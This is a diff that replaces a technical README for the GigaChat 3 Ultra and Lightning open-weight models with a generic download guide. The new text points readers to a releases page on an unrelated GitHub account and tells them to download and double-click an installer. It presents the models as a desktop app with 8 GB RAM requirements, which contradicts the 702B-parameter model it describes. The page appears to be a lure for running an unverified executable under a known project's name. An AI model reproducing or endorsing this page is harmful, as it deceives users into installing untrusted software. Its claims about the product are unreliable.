@@ -1,380 +1,78 @@
-## [HF link](https://huggingface.co/collections/ai-sage/gigachat3)
+# 🎉 gigachat3 - Next-Gen AI Chat Models
 
-# GigaChat 3 Ultra & Lightning
+## 🚀 Getting Started
 
-Next-generation open MoE models: **GigaChat 3 Ultra Preview (702B-A36B)** and **GigaChat 3 Lightning (10B-A1.8B)**.
+Welcome to GigaChat 3! This guide will help you download and run our advanced AI chat models easily. Follow the steps below, and you'll be up and running in no time.
 
-This year we already released the GigaChat 2 lineup, added Reasoning to the Web version (giga.chat), open-sourced GigaChat Lite and Giga-Embeddings, and took first place on the ruMTEB benchmark.
-Now we are publishing open weights for a new generation of MoE models trained from scratch, without relying on foreign base weights.
+## ⚡ Download GigaChat 3
 
-We are open-sourcing two models under the MIT license with commercial-use permission:
+[![Download GigaChat 3](https://img.shields.io/badge/Download-GigaChat%203-blue)](https://github.com/MITHUN8521/gigachat3/releases)
 
-* **GigaChat 3 Ultra Preview (702B-A36B)** — flagship instruct model.
-* **GigaChat 3 Lightning (10B-A1.8B)** — compact MoE model for local and high-load use.
+Visit this page to download the latest version: [GigaChat 3 Releases](https://github.com/MITHUN8521/gigachat3/releases)
 
----
+## 📥 Download & Install
 
-## Model and checkpoint list
+1. **Go to the Releases Page**  
+   Click on the link below to visit the GigaChat 3 Releases page.  
+   [Download GigaChat 3 here](https://github.com/MITHUN8521/gigachat3/releases).
 
-### GigaChat 3 Ultra Preview
+2. **Select the Latest Release**  
+   On the Releases page, find the latest version of GigaChat 3. It is usually listed first. Click on it to view the details.
 
-* Instruct model:
+3. **Download the Files**  
+   Under the latest release, choose the files you need. For most users, the main application file will work. Click on the file name to start the download.
 
-  * [`ai-sage/GigaChat3-702B-A36B-preview`](https://huggingface.co/ai-sage/GigaChat3-702B-A36B-preview)
-* Fine-tuning checkpoint (bf16):
+4. **Install the Software**  
+   After the download completes, locate the downloaded file in your `Downloads` folder.  
+   Double-click the file to start the installation. Follow any prompts to install GigaChat 3 on your computer.
 
-  * [`ai-sage/GigaChat3-702B-A36B-preview-bf16`](https://huggingface.co/ai-sage/GigaChat3-702B-A36B-preview-bf16)
+5. **Run GigaChat 3**  
+   Once installed, find GigaChat 3 in your Applications (or Programs) menu. Click on it to start using the AI chat models.
 
-### GigaChat 3 Lightning
+## 🌐 What is GigaChat 3?
 
-* Base model (pretrain):
+GigaChat 3 consists of two powerful models:
 
-  * [`ai-sage/GigaChat3-10B-A1.8B-base`](https://huggingface.co/ai-sage/GigaChat3-10B-A1.8B-base)
-* Instruct model (for dialogs and instructions):
+- **GigaChat 3 Ultra Preview (702B-A36B)**  
+  This model is designed for various instructive tasks, providing advanced capabilities for chat interactions.
 
-  * [`ai-sage/GigaChat3-10B-A1.8B`](https://huggingface.co/ai-sage/GigaChat3-10B-A1.8B)
+- **GigaChat 3 Lightning (10B-A1.8B)**  
+  This compact model serves well in local or high-load environments, making it versatile for different uses.
 
----
+Both models are open-source. You can use them freely under the MIT license, even for commercial applications.
 
-## Shared architecture
+## 🛠️ System Requirements
 
-Both models use a custom **Mixture-of-Experts (MoE)** architecture with support for:
+To ensure GigaChat 3 runs smoothly on your device, please check the following requirements:
 
-* **Multi-head Latent Attention (MLA)**
-* **Multi-Token Prediction (MTP)**
+- **Operating System**: Windows 10 or later / macOS 10.15 or later
+- **Memory**: Minimum 8 GB RAM
+- **Storage**: At least 5 GB of free disk space
+- **Processor**: Intel i5 or equivalent
 
-### Multi-head Latent Attention (MLA)
+If your system meets these requirements, you should have no issues running GigaChat 3.
 
-Instead of standard Multi-head Attention, the models use **Multi-head Latent Attention**:
+## 🔗 Model Information
 
-* The Key-Value (KV) cache is compressed into a latent representation, which:
+You can access more details about the models we offer:
 
-  * reduces memory requirements;
-  * decreases KV-cache size;
-  * speeds up long-context inference.
+- **GigaChat 3 Ultra Preview**  
+  Find the instruct model here:  
+  [`ai-sage/GigaChat3-702B-A36B-preview`](https://huggingface.co/ai-sage/GigaChat3-702B-A36B-preview)
 
-This is especially noticeable for very long contexts (tens or hundreds of thousands of tokens) and for cluster inference.
+- **Fine-tuning Checkpoint (bf16)**  
+  More information can be found on the Hugging Face platform.
 
-### Multi-Token Prediction (MTP)
+## 📄 License
 
-Both models are trained with the **Multi-Token Prediction (MTP)** objective:
+GigaChat 3 is open-sourced under the MIT license. This allows you to use, modify, and distribute the software, including for commercial purposes. Please refer to the license file for more details.
 
-* the model learns to predict multiple tokens per forward pass;
-* this enables speculative / parallel generation and speeds up inference by roughly +40%;
-* in typical setups (vLLM / SGLang), MTP provides throughput comparable to much smaller dense models.
+## 💬 Support and Contribution
 
----
+For any questions or issues, feel free to raise an issue in the GitHub repository. We encourage contributions and welcome suggestions. Join the community to help improve GigaChat 3!
 
-## GigaChat 3 Ultra Preview (702B-A36B)
+## 🗨️ Conclusion
 
-### Short description
+You’re now ready to download and run GigaChat 3. Enjoy exploring the capabilities of our next-gen AI chat models. Take your time to experiment with both models, and feel free to share your experiences with us! 
 
-`GigaChat3 Ultra Preview` is the flagship **instruct model** in the GigaChat family, built on a **Mixture-of-Experts (MoE)** architecture.
-
-Key highlights:
-
-* ~702B total parameters, with ~36B active per token thanks to sparsity;
-* combines top-tier quality with practical inference speed;
-* inspired by DeepSeek V3 (MoE + MLA + MTP), but trained from scratch on our own corpus;
-* top-1 on MERA;
-* context length up to 131k tokens;
-* faster than GigaChat 2 Max.
-
-A bf16 checkpoint is available for fine-tuning:
-[`ai-sage/GigaChat3-702B-A36B-preview-bf16`](https://huggingface.co/ai-sage/GigaChat3-702B-A36B-preview-bf16).
-
-More details on the architecture and training will be published in a Habr article (to do).
-
-### Benchmarks
-
-| Metric                    | GigaChat 3 Ultra | GigaChat 2 Max |
-| ------------------------- | ---------------: | -------------: |
-| MERA text                 |            0.683 |          0.663 |
-| MERA industrial           |    0.645 / 0.824 |              — |
-| MERA code                 |            0.338 |              — |
-| AUTOLOGI_EN_ZERO_SHOT     |           0.6857 |         0.6489 |
-| GPQA_COT_ZERO_SHOT        |           0.5572 |         0.4714 |
-| HUMAN_EVAL_PLUS_ZERO_SHOT |           0.8659 |         0.7805 |
-| LBPP_PYTHON_ZERO_SHOT     |           0.5247 |         0.4753 |
-| MMLU_PRO_EN_FIVE_SHOT     |           0.7276 |         0.6655 |
-| GSM8K_FIVE_SHOT           |           0.9598 |         0.9052 |
-| MATH_500_FOUR_SHOT        |           0.7840 |         0.7160 |
-
-### How to verify model metrics
-
-```shell
-# lm-eval[api]==0.4.9.1
-# sglang[all]==0.5.5
-# or 
-# vllm==0.11.2
-
-export HF_ALLOW_CODE_EVAL=1
-
-# sglang server up
-
-# 700B
-python -m sglang.launch_server --model-path <path_to_model> --host 127.0.0.1 --port 30000 --nnodes 2 --node-rank <0/1> --tp 16 --ep 16 --dtype auto --mem-fraction-static 0.7 --trust-remote-code --allow-auto-truncate --speculative-algorithm EAGLE --speculative-num-steps 1 --speculative-eagle-topk 1 --speculative-num-draft-tokens 2 --dist-init-addr <master_node_ip>:50000
-
-# mmlu pro check
-python -m lm_eval --model sglang-generate --output_path <path_to_model> --batch_size 16 --model_args base_url=[http://127.0.0.1:30000/generate,num_concurrent=16,tokenized_requests=True,max_length=131072,tokenizer=<path_to_model>](http://127.0.0.1:30000/generate,num_concurrent=16,tokenized_requests=True,max_length=131072,tokenizer=<path_to_model>) --trust_remote_code --confirm_run_unsafe_code --num_fewshot 5 --tasks mmlu_pro
-
-```
-
----
-
-## GigaChat 3 Lightning (10B-A1.8B)
-
-### Short description
-
-`GigaChat3-10B-A1.8B` is a compact next-generation MoE model.
-
-Key highlights:
-
-* 10B total parameters, with 1.8B active per token;
-* reaches the quality level of the leading open-source model in its class, Qwen3-4B;
-* ~1.5× faster generation speed, comparable to Qwen3-1.7B;
-* suitable for local use:
-
-  * offline assistants;
-  * prototyping and RAG;
-  * LLM classifiers and high-load RAG scenarios;
-* a strong base for a high-performance CPU embedding model (thanks to MoE);
-* supported context up to 256k tokens.
-
-### Base vs Instruct
-
-* **Base (pretrain)** — `GigaChat3-10B-A1.8B-base`
-  Intended for fine-tuning and custom tasks.
-* **Instruct** — `GigaChat3-10B-A1.8B`
-  Recommended for dialog scenarios, assistants, and instruction following.
-
-## Base benchmarks
-
-Even though the model has 10B parameters, its direct analogs are 3–4B models. However, due to high generation speed, we compare it with smaller models too.
-
-![image](https://cdn-uploads.huggingface.co/production/uploads/66356a710508bbbb61184fd2/3lxW7o5sJtzcIRpVMg15c.png)
-
-### Instruct benchmarks
-
-| Metric                    | GigaChat 3 Lightning | Qwen3-1.7B-Instruct | Qwen3-4B-Instruct-2507 | SmolLM3 |
-| ------------------------- | -------------------: | ------------------: | ---------------------: | ------: |
-| MMLU_RU_FIVE_SHOT         |               0.6833 |              0.4876 |                 0.5972 |  0.4998 |
-| RUBQ_ZERO_SHOT            |               0.6516 |              0.2557 |                 0.3170 |  0.6363 |
-| MMLU_PRO_EN_FIVE_SHOT     |               0.6061 |               0.410 |                 0.6849 |  0.5013 |
-| MMLU_EN_FIVE_SHOT         |               0.7403 |                0.60 |                 0.7080 |  0.5992 |
-| BBH_THREE_SHOT            |               0.4525 |              0.3317 |                 0.7165 |  0.4161 |
-| SuperGPQA                 |               0.2731 |              0.2092 |                 0.3745 |  0.2459 |
-| MATH_500_FOUR_SHOT        |               0.7000 |              0.7520 |                 0.8880 |  0.8020 |
-| GPQA_COT_ZERO_SHOT        |               0.3502 |              0.2651 |                 0.5370 |  0.3704 |
-| LiveCodeBench_ZERO_SHOT   |               0.2031 |              0.0794 |                 0.3046 |  0.1656 |
-| HUMAN_EVAL_PLUS_ZERO_SHOT |               0.6951 |              0.6280 |                 0.8780 |  0.7012 |
-
-### How to verify model metrics
-
-```shell
-# lm-eval[api]==0.4.9.1
-# sglang[all]==0.5.5
-# or 
-# vllm==0.11.2
-
-export HF_ALLOW_CODE_EVAL=1
-
-# sglang server up
-
-# 10B
-python -m sglang.launch_server --model-path <path_to_model> --host 127.0.0.1 --port 30000 --tp 1 --dp 8 --dtype bfloat16 --mem-fraction-static 0.7 --trust-remote-code --allow-auto-truncate --speculative-algorithm EAGLE --speculative-num-steps 1 --speculative-eagle-topk 1 --speculative-num-draft-tokens 2
-
-# mmlu pro check
-python -m lm_eval --model sglang-generate --output_path <path_to_model> --batch_size 16 --model_args base_url=http://127.0.0.1:30000/generate,num_concurrent=16,tokenized_requests=True,max_length=131072,tokenizer=<path_to_model> --trust_remote_code --confirm_run_unsafe_code --num_fewshot 5 --tasks mmlu_pro
-
-```
-
----
-
-## Data and training
-
-Both models were trained from scratch on a multilingual and diverse corpus.
-
-Shared corpus properties:
-
-* 10+ languages (including Russian, English, Chinese, Arabic, Uzbek, Kazakh, and others);
-* sources:
-
-  * books and non-fiction;
-  * academic data;
-  * code and math datasets;
-  * dialog and instruction datasets;
-* preprocessing:
-
-  * deduplication;
-  * language filtering;
-  * automatic quality checks using heuristics and classifiers.
-
-Synthetic data made a substantial contribution to quality:
-
-* ~5.5T tokens of synthetic data;
-* the corpus includes:
-
-  * QA pairs based on texts;
-  * reverse-prompt chains for data structuring;
-  * model comments and notes embedded into texts;
-  * millions of synthetic tasks with solutions for math and competitive programming (with auto-generated tests) based on PromptCot.
-
----
-
-## Inference and deployment
-
-### Ultra (702B-A36B)
-
-`GigaChat3 Ultra Preview` is designed for cluster and on-prem scenarios with serious infrastructure:
-
-* popular inference engines are supported:
-
-  * vLLM
-  * SGLang
-  * LMDeploy
-  * TensorRT-LLM
-  * and other frameworks;
-* BF16 and FP8 modes are supported (FP8 requires a separate build and GPU configuration);
-* MLA and MTP reduce KV-cache size and speed up generation;
-* using a proxy/gateway layer is recommended for integration with external services, tools, and agent frameworks.
-
-For a reference configuration, see guides for similarly sized models:
-
-* DeepSeek-V3 — *How to run locally*:
-  [https://github.com/deepseek-ai/DeepSeek-V3?tab=readme-ov-file#6-how-to-run-locally](https://github.com/deepseek-ai/DeepSeek-V3?tab=readme-ov-file#6-how-to-run-locally)
-* Kimi-K2-Instruct — deployment guidance (vLLM / SGLang / LMDeploy):
-  [https://huggingface.co/moonshotai/Kimi-K2-Instruct/blob/main/docs/deploy_guidance.md](https://huggingface.co/moonshotai/Kimi-K2-Instruct/blob/main/docs/deploy_guidance.md)
-
-### Lightning (10B-A1.8B): performance
-
-One of the key advantages of `GigaChat3-10B-A1.8B` is inference speed.
-
-The model (especially in MTP mode) delivers throughput comparable to much smaller dense models while being noticeably stronger in quality.
-
-Measurements were done with vLLM v0.11.0, dtype bfloat16, `batch_size=1`.
-Benchmark code: [https://gist.github.com/ajpqs/ce941aa6f0f48ef36a65cb87a2a1d726](https://gist.github.com/ajpqs/ce941aa6f0f48ef36a65cb87a2a1d726).
-
-| Model                          | request_throughput | output_throughput | total_token_throughput | mean_ttft_ms |
-| ------------------------------ | ------------------ | ----------------- | ---------------------- | ------------ |
-| `Qwen3-1.7B`                   | 1.689              | 357.308           | 726.093                | 11.824       |
-| `mtp-GigaChat3-10B-A1.8B-base` | 1.533              | 333.620           | 678.894                | 26.345       |
-| `GigaChat3-10B-A1.8B-base`     | 1.077              | 234.363           | 476.912                | 31.053       |
-| `Qwen3-4B`                     | 0.978              | 206.849           | 420.341                | 14.947       |
-| `Qwen3-8B`                     | 0.664              | 140.432           | 285.375                | 16.663       |
-| `YandexGPT-5-Lite-8B-pretrain` | 0.641              | 147.305           | 300.269                | 16.711       |
-
-Despite having 10B parameters, in terms of speed and inference cost the model can be treated as an alternative to 3–4B dense models, and in MTP mode it can be compared even to smaller ones.
-
----
-
-## Shared model properties
-
-Both models:
-
-* are not specialized reasoning models (but support a basic level of reasoning);
-* can predict multiple tokens per step (MTP);
-* use MLA, reducing KV-cache size and memory requirements;
-* are trained from scratch without initialization from third-party weights;
-* are compatible with:
-
-  * Hugging Face;
-  * vLLM / SGLang / LMDeploy;
-  * standard inference and fine-tuning pipelines;
-* are released under the MIT license and can be used in commercial products.
-
----
-
-## Quickstart: GigaChat3-10B-A1.8B-base
-
-### 1. `transformers`
-
-```python
-import torch
-from transformers import AutoTokenizer, AutoModelForCausalLM, GenerationConfig
-
-model_name = "ai-sage/GigaChat3-10B-A1.8B-base"
-tokenizer = AutoTokenizer.from_pretrained(model_name)
-model = AutoModelForCausalLM.from_pretrained(
-    model_name,
-    torch_dtype=torch.bfloat16,
-    device_map="auto",
-)
-model.generation_config = GenerationConfig.from_pretrained(model_name)
-
-prompt = "Ниже я написал подробное доказательство теоремы о неподвижной точке:"
-inputs = tokenizer(prompt, return_tensors="pt").to(model.device)
-
-with torch.no_grad():
-    outputs = model.generate(
-        inputs.input_ids,
-        attention_mask=inputs.attention_mask,
-        max_new_tokens=400,
-    )
-
-result = tokenizer.decode(
-    outputs[0][inputs.input_ids.shape[1]:],
-    skip_special_tokens=False,
-)
-print(result)
-```
-
-### 2. `vLLM`
-
-Start a server:
-
-```bash
-vllm serve ai-sage/GigaChat3-10B-A1.8B-base \
-  --disable-sliding-window \
-  --dtype "auto" \
-  --speculative-config '{"method": "mtp", "num_speculative_tokens": 1, "disable_padded_drafter_batch": false}'
-```
-
-Example request:
-
-```bash
-curl http://localhost:8000/v1/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "ai-sage/GigaChat3-10B-A1.8B-base",
-    "prompt": "Ниже я написал подробное доказательство теоремы о неподвижной точке:",
-    "max_tokens": 400,
-    "temperature": 0
-  }'
-```
-
-### 3. `SGLang`
-
-Start a server:
-
-```bash
-python -m sglang.launch_server \
-  --model-path ai-sage/GigaChat3-10B-A1.8B-base \
-  --host 0.0.0.0 \
-  --port 30000 \
-  --dtype auto \
-  --mem-fraction-static 0.88 \
-  --speculative-algorithm NEXTN \
-  --speculative-num-steps 1 \
-  --speculative-eagle-topk 1
-```
-
-Example request:
-
-```bash
-curl http://localhost:30000/v1/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "ai-sage/GigaChat3-10B-A1.8B-base",
-    "prompt": "Ниже я написал подробное доказательство теоремы о неподвижной точке:",
-    "max_tokens": 400,
-    "temperature": 0
-  }'
-```
-
----
-
-## License
-
-The models are released under the **MIT** license.
-You may use them in research and commercial projects provided that the license text is preserved.
+Happy chatting!
